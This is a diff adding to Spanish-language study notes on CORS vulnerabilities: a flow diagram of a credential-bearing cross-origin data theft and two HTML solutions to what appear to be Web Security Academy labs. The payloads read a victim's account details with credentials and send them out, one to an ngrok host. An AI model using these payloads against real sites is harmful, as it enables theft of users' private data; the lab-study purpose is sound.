@@ -43,3 +43,68 @@ Para mitigar las vulnerabilidades de CORS:
 - **Auditoría y pruebas**: Regularmente audita y prueba la configuración de CORS para detectar posibles fallos.
 
 En resumen, CORS es una herramienta poderosa para controlar el acceso a recursos web entre diferentes orígenes, pero debe configurarse cuidadosamente para evitar introducir vulnerabilidades que puedan ser explotadas por atacantes.
+
+### Diagrama de flujo
+[Atacante] --> [Envía script a la víctima]
+           ↓
+[Víctima] --> [Ejecuta script en navegador]
+           ↓
+[Navegador] --> [Envia solicitud a servidor objetivo]
+             --> [Incluye cookies de la víctima]
+           ↓
+[Servidor objetivo] --> [Responde con datos sensibles]
+           ↓
+[Navegador] --> [Envía datos al servidor del atacante]
+           ↓
+[Servidor del atacante] --> [Recibe datos exfiltrados]
+
+
+# Solucion a labs: 
+-- -
+## Lab 1:
+```html
+<html>
+<body>
+<script>
+var xhr = new XMLHttpRequest();
+var url = "https://0a1a007704d32a8281f59fa800410046.web-security-academy.net";
+
+xhr.onreadystatechange = function () {
+    if (xhr.readyState == XMLHttpRequest.DONE){
+        fetch("/log?key=" + xhr.responseText)
+    }
+}
+
+xhr.open('GET', url + "/accountDetails", true);
+xhr.withCredentials = true;
+xhr.send(null);
+</script>
+</body>
+</html>
+
+```
+
+## Lab 2:
+```html
+<!DOCTYPE html>
+<html>
+    <body>
+        <iframe style="display: none;" sandbox="allow-scripts" srcdoc="
+        <script>
+            var xhr = new XMLHttpRequest();
+            var url = 'https://0a1a007704d32a8281f59fa800410046.web-security-academy.net';
+
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState == XMLHttpRequest.DONE){
+                    fetch('https://b475-2800-810-505-690-46cf-1896-a812-4ce0.ngrok-free.app/log?key=' + xhr.responseText)
+                }
+            }
+
+            xhr.open('GET', url + '/accountDetails', true);
+            xhr.withCredentials = true;
+            xhr.send(null)
+        </script>"></iframe>
+    </body>
+</html>
+
+```
